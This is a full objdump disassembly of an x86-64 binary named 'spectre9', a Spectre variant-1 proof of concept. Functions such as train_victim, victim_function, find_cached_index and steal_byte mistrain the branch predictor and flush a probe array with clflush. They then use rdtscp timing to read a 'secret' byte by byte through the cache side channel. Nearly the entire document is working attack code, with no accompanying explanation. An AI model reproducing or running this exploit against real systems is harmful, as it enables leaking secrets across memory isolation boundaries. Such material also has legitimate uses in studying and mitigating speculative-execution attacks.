
spectre9:     file format elf64-x86-64


Disassembly of section .init:

0000000000000590 <_init>:
 590:	48 83 ec 08          	sub    $0x8,%rsp
 594:	48 8b 05 4d 1a 20 00 	mov    0x201a4d(%rip),%rax        # 201fe8 <__gmon_start__>
 59b:	48 85 c0             	test   %rax,%rax
 59e:	74 02                	je     5a2 <_init+0x12>
 5a0:	ff d0                	callq  *%rax
 5a2:	48 83 c4 08          	add    $0x8,%rsp
 5a6:	c3                   	retq   

Disassembly of section .plt:

00000000000005b0 <.plt>:
 5b0:	ff 35 fa 19 20 00    	pushq  0x2019fa(%rip)        # 201fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
 5b6:	ff 25 fc 19 20 00    	jmpq   *0x2019fc(%rip)        # 201fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
 5bc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000005c0 <free@plt>:
 5c0:	ff 25 fa 19 20 00    	jmpq   *0x2019fa(%rip)        # 201fc0 <free@GLIBC_2.2.5>
 5c6:	68 00 00 00 00       	pushq  $0x0
 5cb:	e9 e0 ff ff ff       	jmpq   5b0 <.plt>

00000000000005d0 <printf@plt>:
 5d0:	ff 25 f2 19 20 00    	jmpq   *0x2019f2(%rip)        # 201fc8 <printf@GLIBC_2.2.5>
 5d6:	68 01 00 00 00       	pushq  $0x1
 5db:	e9 d0 ff ff ff       	jmpq   5b0 <.plt>

00000000000005e0 <malloc@plt>:
 5e0:	ff 25 ea 19 20 00    	jmpq   *0x2019ea(%rip)        # 201fd0 <malloc@GLIBC_2.2.5>
 5e6:	68 02 00 00 00       	pushq  $0x2
 5eb:	e9 c0 ff ff ff       	jmpq   5b0 <.plt>

Disassembly of section .plt.got:

00000000000005f0 <__cxa_finalize@plt>:
 5f0:	ff 25 02 1a 20 00    	jmpq   *0x201a02(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 5f6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000000600 <_start>:
 600:	31 ed                	xor    %ebp,%ebp
 602:	49 89 d1             	mov    %rdx,%r9
 605:	5e                   	pop    %rsi
 606:	48 89 e2             	mov    %rsp,%rdx
 609:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 60d:	50                   	push   %rax
 60e:	54                   	push   %rsp
 60f:	4c 8d 05 4a 05 00 00 	lea    0x54a(%rip),%r8        # b60 <__libc_csu_fini>
 616:	48 8d 0d d3 04 00 00 	lea    0x4d3(%rip),%rcx        # af0 <__libc_csu_init>
 61d:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 70a <main>
 624:	ff 15 b6 19 20 00    	callq  *0x2019b6(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 62a:	f4                   	hlt    
 62b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000630 <deregister_tm_clones>:
 630:	48 8d 3d e9 1a 20 00 	lea    0x201ae9(%rip),%rdi        # 202120 <__TMC_END__>
 637:	55                   	push   %rbp
 638:	48 8d 05 e1 1a 20 00 	lea    0x201ae1(%rip),%rax        # 202120 <__TMC_END__>
 63f:	48 39 f8             	cmp    %rdi,%rax
 642:	48 89 e5             	mov    %rsp,%rbp
 645:	74 19                	je     660 <deregister_tm_clones+0x30>
 647:	48 8b 05 8a 19 20 00 	mov    0x20198a(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 64e:	48 85 c0             	test   %rax,%rax
 651:	74 0d                	je     660 <deregister_tm_clones+0x30>
 653:	5d                   	pop    %rbp
 654:	ff e0                	jmpq   *%rax
 656:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 65d:	00 00 00 
 660:	5d                   	pop    %rbp
 661:	c3                   	retq   
 662:	0f 1f 40 00          	nopl   0x0(%rax)
 666:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 66d:	00 00 00 

0000000000000670 <register_tm_clones>:
 670:	48 8d 3d a9 1a 20 00 	lea    0x201aa9(%rip),%rdi        # 202120 <__TMC_END__>
 677:	48 8d 35 a2 1a 20 00 	lea    0x201aa2(%rip),%rsi        # 202120 <__TMC_END__>
 67e:	55                   	push   %rbp
 67f:	48 29 fe             	sub    %rdi,%rsi
 682:	48 89 e5             	mov    %rsp,%rbp
 685:	48 c1 fe 03          	sar    $0x3,%rsi
 689:	48 89 f0             	mov    %rsi,%rax
 68c:	48 c1 e8 3f          	shr    $0x3f,%rax
 690:	48 01 c6             	add    %rax,%rsi
 693:	48 d1 fe             	sar    %rsi
 696:	74 18                	je     6b0 <register_tm_clones+0x40>
 698:	48 8b 05 51 19 20 00 	mov    0x201951(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 69f:	48 85 c0             	test   %rax,%rax
 6a2:	74 0c                	je     6b0 <register_tm_clones+0x40>
 6a4:	5d                   	pop    %rbp
 6a5:	ff e0                	jmpq   *%rax
 6a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 6ae:	00 00 
 6b0:	5d                   	pop    %rbp
 6b1:	c3                   	retq   
 6b2:	0f 1f 40 00          	nopl   0x0(%rax)
 6b6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 6bd:	00 00 00 

00000000000006c0 <__do_global_dtors_aux>:
 6c0:	80 3d 59 1a 20 00 00 	cmpb   $0x0,0x201a59(%rip)        # 202120 <__TMC_END__>
 6c7:	75 2f                	jne    6f8 <__do_global_dtors_aux+0x38>
 6c9:	48 83 3d 27 19 20 00 	cmpq   $0x0,0x201927(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 6d0:	00 
 6d1:	55                   	push   %rbp
 6d2:	48 89 e5             	mov    %rsp,%rbp
 6d5:	74 0c                	je     6e3 <__do_global_dtors_aux+0x23>
 6d7:	48 8b 3d 2a 19 20 00 	mov    0x20192a(%rip),%rdi        # 202008 <__dso_handle>
 6de:	e8 0d ff ff ff       	callq  5f0 <__cxa_finalize@plt>
 6e3:	e8 48 ff ff ff       	callq  630 <deregister_tm_clones>
 6e8:	c6 05 31 1a 20 00 01 	movb   $0x1,0x201a31(%rip)        # 202120 <__TMC_END__>
 6ef:	5d                   	pop    %rbp
 6f0:	c3                   	retq   
 6f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 6f8:	f3 c3                	repz retq 
 6fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000000700 <frame_dummy>:
 700:	55                   	push   %rbp
 701:	48 89 e5             	mov    %rsp,%rbp
 704:	5d                   	pop    %rbp
 705:	e9 66 ff ff ff       	jmpq   670 <register_tm_clones>

000000000000070a <main>:
 70a:	55                   	push   %rbp
 70b:	48 89 e5             	mov    %rsp,%rbp
 70e:	48 83 ec 20          	sub    $0x20,%rsp
 712:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 719:	eb 24                	jmp    73f <main+0x35>
 71b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 71e:	99                   	cltd   
 71f:	c1 ea 18             	shr    $0x18,%edx
 722:	01 d0                	add    %edx,%eax
 724:	0f b6 c0             	movzbl %al,%eax
 727:	29 d0                	sub    %edx,%eax
 729:	89 c1                	mov    %eax,%ecx
 72b:	8b 45 e0             	mov    -0x20(%rbp),%eax
 72e:	48 63 d0             	movslq %eax,%rdx
 731:	48 8d 05 08 1a 20 00 	lea    0x201a08(%rip),%rax        # 202140 <array>
 738:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 73b:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 73f:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 746:	7e d3                	jle    71b <main+0x11>
 748:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 74f:	e9 b1 00 00 00       	jmpq   805 <main+0xfb>
 754:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 75b:	eb 1a                	jmp    777 <main+0x6d>
 75d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 760:	c1 e0 0c             	shl    $0xc,%eax
 763:	48 63 d0             	movslq %eax,%rdx
 766:	48 8d 05 d3 19 20 00 	lea    0x2019d3(%rip),%rax        # 202140 <array>
 76d:	48 01 d0             	add    %rdx,%rax
 770:	0f ae 38             	clflush (%rax)
 773:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 777:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 77e:	7e dd                	jle    75d <main+0x53>
 780:	0f ae f0             	mfence 
 783:	bf 00 04 00 00       	mov    $0x400,%edi
 788:	e8 53 fe ff ff       	callq  5e0 <malloc@plt>
 78d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 791:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 798:	eb 1e                	jmp    7b8 <main+0xae>
 79a:	8b 45 ec             	mov    -0x14(%rbp),%eax
 79d:	48 98                	cltq   
 79f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 7a6:	00 
 7a7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7ab:	48 01 d0             	add    %rdx,%rax
 7ae:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 7b4:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 7b8:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 7bf:	7e d9                	jle    79a <main+0x90>
 7c1:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 7c4:	48 98                	cltq   
 7c6:	48 8d 0d 13 19 20 00 	lea    0x201913(%rip),%rcx        # 2020e0 <secret>
 7cd:	48 8d 15 6c 18 20 00 	lea    0x20186c(%rip),%rdx        # 202040 <buffer>
 7d4:	48 29 d1             	sub    %rdx,%rcx
 7d7:	48 89 ca             	mov    %rcx,%rdx
 7da:	48 01 d0             	add    %rdx,%rax
 7dd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 7e1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 7e5:	89 c2                	mov    %eax,%edx
 7e7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7eb:	89 d6                	mov    %edx,%esi
 7ed:	48 89 c7             	mov    %rax,%rdi
 7f0:	e8 42 02 00 00       	callq  a37 <steal_byte>
 7f5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7f9:	48 89 c7             	mov    %rax,%rdi
 7fc:	e8 bf fd ff ff       	callq  5c0 <free@plt>
 801:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 805:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 809:	0f 8e 45 ff ff ff    	jle    754 <main+0x4a>
 80f:	b8 00 00 00 00       	mov    $0x0,%eax
 814:	c9                   	leaveq 
 815:	c3                   	retq   

0000000000000816 <find_cached_index>:
 816:	55                   	push   %rbp
 817:	48 89 e5             	mov    %rsp,%rbp
 81a:	53                   	push   %rbx
 81b:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 81f:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 826:	eb 5a                	jmp    882 <find_cached_index+0x6c>
 828:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 82f:	00 
 830:	8b 45 ec             	mov    -0x14(%rbp),%eax
 833:	c1 e0 0c             	shl    $0xc,%eax
 836:	48 63 d0             	movslq %eax,%rdx
 839:	48 8d 05 00 19 20 00 	lea    0x201900(%rip),%rax        # 202140 <array>
 840:	48 01 d0             	add    %rdx,%rax
 843:	48 89 c3             	mov    %rax,%rbx
 846:	0f ae f0             	mfence 
 849:	0f 01 f9             	rdtscp 
 84c:	49 89 c2             	mov    %rax,%r10
 84f:	48 8b 0b             	mov    (%rbx),%rcx
 852:	0f 01 f9             	rdtscp 
 855:	4c 29 d0             	sub    %r10,%rax
 858:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 85c:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 861:	77 1b                	ja     87e <find_cached_index+0x68>
 863:	8b 45 ec             	mov    -0x14(%rbp),%eax
 866:	48 98                	cltq   
 868:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 86f:	00 
 870:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 874:	48 01 d0             	add    %rdx,%rax
 877:	8b 10                	mov    (%rax),%edx
 879:	83 c2 01             	add    $0x1,%edx
 87c:	89 10                	mov    %edx,(%rax)
 87e:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 882:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 889:	7e 9d                	jle    828 <find_cached_index+0x12>
 88b:	90                   	nop
 88c:	5b                   	pop    %rbx
 88d:	5d                   	pop    %rbp
 88e:	c3                   	retq   

000000000000088f <find_highest_score>:
 88f:	55                   	push   %rbp
 890:	48 89 e5             	mov    %rsp,%rbp
 893:	48 83 ec 20          	sub    $0x20,%rsp
 897:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 89b:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 8a2:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 8a9:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 8b0:	eb 3e                	jmp    8f0 <find_highest_score+0x61>
 8b2:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8b5:	48 98                	cltq   
 8b7:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 8be:	00 
 8bf:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 8c3:	48 01 d0             	add    %rdx,%rax
 8c6:	8b 00                	mov    (%rax),%eax
 8c8:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 8cb:	7d 1f                	jge    8ec <find_highest_score+0x5d>
 8cd:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8d0:	89 45 f8             	mov    %eax,-0x8(%rbp)
 8d3:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8d6:	48 98                	cltq   
 8d8:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 8df:	00 
 8e0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 8e4:	48 01 d0             	add    %rdx,%rax
 8e7:	8b 00                	mov    (%rax),%eax
 8e9:	89 45 f4             	mov    %eax,-0xc(%rbp)
 8ec:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 8f0:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 8f7:	7e b9                	jle    8b2 <find_highest_score+0x23>
 8f9:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 8fc:	8b 55 f8             	mov    -0x8(%rbp),%edx
 8ff:	8b 45 f8             	mov    -0x8(%rbp),%eax
 902:	89 c6                	mov    %eax,%esi
 904:	48 8d 3d 6d 02 00 00 	lea    0x26d(%rip),%rdi        # b78 <_IO_stdin_used+0x8>
 90b:	b8 00 00 00 00       	mov    $0x0,%eax
 910:	e8 bb fc ff ff       	callq  5d0 <printf@plt>
 915:	90                   	nop
 916:	c9                   	leaveq 
 917:	c3                   	retq   

0000000000000918 <train_victim>:
 918:	55                   	push   %rbp
 919:	48 89 e5             	mov    %rsp,%rbp
 91c:	48 83 ec 10          	sub    $0x10,%rsp
 920:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 927:	e9 9a 00 00 00       	jmpq   9c6 <train_victim+0xae>
 92c:	48 8b 35 dd 17 20 00 	mov    0x2017dd(%rip),%rsi        # 202110 <x_is_safe>
 933:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 936:	ba 67 66 66 66       	mov    $0x66666667,%edx
 93b:	89 c8                	mov    %ecx,%eax
 93d:	f7 ea                	imul   %edx
 93f:	c1 fa 02             	sar    $0x2,%edx
 942:	89 c8                	mov    %ecx,%eax
 944:	c1 f8 1f             	sar    $0x1f,%eax
 947:	29 c2                	sub    %eax,%edx
 949:	89 d0                	mov    %edx,%eax
 94b:	c1 e0 02             	shl    $0x2,%eax
 94e:	01 d0                	add    %edx,%eax
 950:	01 c0                	add    %eax,%eax
 952:	29 c1                	sub    %eax,%ecx
 954:	89 ca                	mov    %ecx,%edx
 956:	48 63 c2             	movslq %edx,%rax
 959:	48 89 c7             	mov    %rax,%rdi
 95c:	e8 37 01 00 00       	callq  a98 <victim_function>
 961:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 968:	eb 1a                	jmp    984 <train_victim+0x6c>
 96a:	8b 45 f8             	mov    -0x8(%rbp),%eax
 96d:	c1 e0 0c             	shl    $0xc,%eax
 970:	48 63 d0             	movslq %eax,%rdx
 973:	48 8d 05 c6 17 20 00 	lea    0x2017c6(%rip),%rax        # 202140 <array>
 97a:	48 01 d0             	add    %rdx,%rax
 97d:	0f ae 38             	clflush (%rax)
 980:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 984:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 98b:	7e dd                	jle    96a <train_victim+0x52>
 98d:	0f ae f0             	mfence 
 990:	48 8d 05 89 16 20 00 	lea    0x201689(%rip),%rax        # 202020 <bufferSize>
 997:	0f ae 38             	clflush (%rax)
 99a:	48 8b 05 6f 17 20 00 	mov    0x20176f(%rip),%rax        # 202110 <x_is_safe>
 9a1:	0f ae 38             	clflush (%rax)
 9a4:	48 8b 05 6d 17 20 00 	mov    0x20176d(%rip),%rax        # 202118 <x_is_unsafe>
 9ab:	0f ae 38             	clflush (%rax)
 9ae:	48 8d 05 57 17 20 00 	lea    0x201757(%rip),%rax        # 20210c <one>
 9b5:	0f ae 38             	clflush (%rax)
 9b8:	48 8d 05 69 17 20 00 	lea    0x201769(%rip),%rax        # 202128 <zero>
 9bf:	0f ae 38             	clflush (%rax)
 9c2:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 9c6:	83 7d f4 13          	cmpl   $0x13,-0xc(%rbp)
 9ca:	0f 8e 5c ff ff ff    	jle    92c <train_victim+0x14>
 9d0:	0f ae e8             	lfence 
 9d3:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 9da:	eb 1a                	jmp    9f6 <train_victim+0xde>
 9dc:	8b 45 fc             	mov    -0x4(%rbp),%eax
 9df:	c1 e0 0c             	shl    $0xc,%eax
 9e2:	48 63 d0             	movslq %eax,%rdx
 9e5:	48 8d 05 54 17 20 00 	lea    0x201754(%rip),%rax        # 202140 <array>
 9ec:	48 01 d0             	add    %rdx,%rax
 9ef:	0f ae 38             	clflush (%rax)
 9f2:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 9f6:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 9fd:	7e dd                	jle    9dc <train_victim+0xc4>
 9ff:	0f ae f0             	mfence 
 a02:	48 8d 05 17 16 20 00 	lea    0x201617(%rip),%rax        # 202020 <bufferSize>
 a09:	0f ae 38             	clflush (%rax)
 a0c:	48 8b 05 fd 16 20 00 	mov    0x2016fd(%rip),%rax        # 202110 <x_is_safe>
 a13:	0f ae 38             	clflush (%rax)
 a16:	48 8b 05 fb 16 20 00 	mov    0x2016fb(%rip),%rax        # 202118 <x_is_unsafe>
 a1d:	0f ae 38             	clflush (%rax)
 a20:	48 8d 05 e5 16 20 00 	lea    0x2016e5(%rip),%rax        # 20210c <one>
 a27:	0f ae 38             	clflush (%rax)
 a2a:	48 8d 05 f7 16 20 00 	lea    0x2016f7(%rip),%rax        # 202128 <zero>
 a31:	0f ae 38             	clflush (%rax)
 a34:	90                   	nop
 a35:	c9                   	leaveq 
 a36:	c3                   	retq   

0000000000000a37 <steal_byte>:
 a37:	55                   	push   %rbp
 a38:	48 89 e5             	mov    %rsp,%rbp
 a3b:	48 83 ec 20          	sub    $0x20,%rsp
 a3f:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 a43:	89 75 e4             	mov    %esi,-0x1c(%rbp)
 a46:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 a4d:	eb 31                	jmp    a80 <steal_byte+0x49>
 a4f:	b8 00 00 00 00       	mov    $0x0,%eax
 a54:	e8 bf fe ff ff       	callq  918 <train_victim>
 a59:	48 8b 15 b8 16 20 00 	mov    0x2016b8(%rip),%rdx        # 202118 <x_is_unsafe>
 a60:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 a63:	48 98                	cltq   
 a65:	48 89 d6             	mov    %rdx,%rsi
 a68:	48 89 c7             	mov    %rax,%rdi
 a6b:	e8 28 00 00 00       	callq  a98 <victim_function>
 a70:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 a74:	48 89 c7             	mov    %rax,%rdi
 a77:	e8 9a fd ff ff       	callq  816 <find_cached_index>
 a7c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 a80:	81 7d fc e7 03 00 00 	cmpl   $0x3e7,-0x4(%rbp)
 a87:	7e c6                	jle    a4f <steal_byte+0x18>
 a89:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 a8d:	48 89 c7             	mov    %rax,%rdi
 a90:	e8 fa fd ff ff       	callq  88f <find_highest_score>
 a95:	90                   	nop
 a96:	c9                   	leaveq 
 a97:	c3                   	retq   

0000000000000a98 <victim_function>:
 a98:	55                   	push   %rbp
 a99:	48 89 e5             	mov    %rsp,%rbp
 a9c:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 aa0:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
 aa4:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 aa8:	8b 00                	mov    (%rax),%eax
 aaa:	85 c0                	test   %eax,%eax
 aac:	74 34                	je     ae2 <victim_function+0x4a>
 aae:	48 8d 15 8b 15 20 00 	lea    0x20158b(%rip),%rdx        # 202040 <buffer>
 ab5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 ab9:	48 01 d0             	add    %rdx,%rax
 abc:	0f b6 00             	movzbl (%rax),%eax
 abf:	0f b6 c0             	movzbl %al,%eax
 ac2:	c1 e0 0c             	shl    $0xc,%eax
 ac5:	48 63 d0             	movslq %eax,%rdx
 ac8:	48 8d 05 71 16 20 00 	lea    0x201671(%rip),%rax        # 202140 <array>
 acf:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 ad3:	0f b6 05 4a 16 20 00 	movzbl 0x20164a(%rip),%eax        # 202124 <temp>
 ada:	21 d0                	and    %edx,%eax
 adc:	88 05 42 16 20 00    	mov    %al,0x201642(%rip)        # 202124 <temp>
 ae2:	90                   	nop
 ae3:	5d                   	pop    %rbp
 ae4:	c3                   	retq   
 ae5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 aec:	00 00 00 
 aef:	90                   	nop

0000000000000af0 <__libc_csu_init>:
 af0:	41 57                	push   %r15
 af2:	41 56                	push   %r14
 af4:	49 89 d7             	mov    %rdx,%r15
 af7:	41 55                	push   %r13
 af9:	41 54                	push   %r12
 afb:	4c 8d 25 a6 12 20 00 	lea    0x2012a6(%rip),%r12        # 201da8 <__frame_dummy_init_array_entry>
 b02:	55                   	push   %rbp
 b03:	48 8d 2d a6 12 20 00 	lea    0x2012a6(%rip),%rbp        # 201db0 <__init_array_end>
 b0a:	53                   	push   %rbx
 b0b:	41 89 fd             	mov    %edi,%r13d
 b0e:	49 89 f6             	mov    %rsi,%r14
 b11:	4c 29 e5             	sub    %r12,%rbp
 b14:	48 83 ec 08          	sub    $0x8,%rsp
 b18:	48 c1 fd 03          	sar    $0x3,%rbp
 b1c:	e8 6f fa ff ff       	callq  590 <_init>
 b21:	48 85 ed             	test   %rbp,%rbp
 b24:	74 20                	je     b46 <__libc_csu_init+0x56>
 b26:	31 db                	xor    %ebx,%ebx
 b28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 b2f:	00 
 b30:	4c 89 fa             	mov    %r15,%rdx
 b33:	4c 89 f6             	mov    %r14,%rsi
 b36:	44 89 ef             	mov    %r13d,%edi
 b39:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 b3d:	48 83 c3 01          	add    $0x1,%rbx
 b41:	48 39 dd             	cmp    %rbx,%rbp
 b44:	75 ea                	jne    b30 <__libc_csu_init+0x40>
 b46:	48 83 c4 08          	add    $0x8,%rsp
 b4a:	5b                   	pop    %rbx
 b4b:	5d                   	pop    %rbp
 b4c:	41 5c                	pop    %r12
 b4e:	41 5d                	pop    %r13
 b50:	41 5e                	pop    %r14
 b52:	41 5f                	pop    %r15
 b54:	c3                   	retq   
 b55:	90                   	nop
 b56:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 b5d:	00 00 00 

0000000000000b60 <__libc_csu_fini>:
 b60:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000b64 <_fini>:
 b64:	48 83 ec 08          	sub    $0x8,%rsp
 b68:	48 83 c4 08          	add    $0x8,%rsp
 b6c:	c3                   	retq   
